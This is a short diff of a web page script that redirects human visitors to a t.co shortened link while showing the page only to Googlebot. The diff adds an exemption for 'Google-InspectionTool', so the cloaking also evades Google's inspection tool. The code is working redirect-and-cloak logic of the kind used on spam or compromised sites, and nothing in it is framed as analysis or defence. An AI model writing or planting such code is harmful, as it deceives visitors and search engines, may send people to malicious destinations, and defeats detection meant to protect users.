@@ -1,5 +1,10 @@
-if (!navigator.userAgent.includes('Googlebot')) {
+const ua = navigator.userAgent;
+
+if (
+  !ua.includes('Googlebot') &&
+  !ua.includes('Google-InspectionTool')
+) {
   window.location.href = "https://t.co/88liu8ZUFm";
 } else {
-  console.log("THanks for visiting my page");
+  console.log("Thanks for visiting my page");
 }
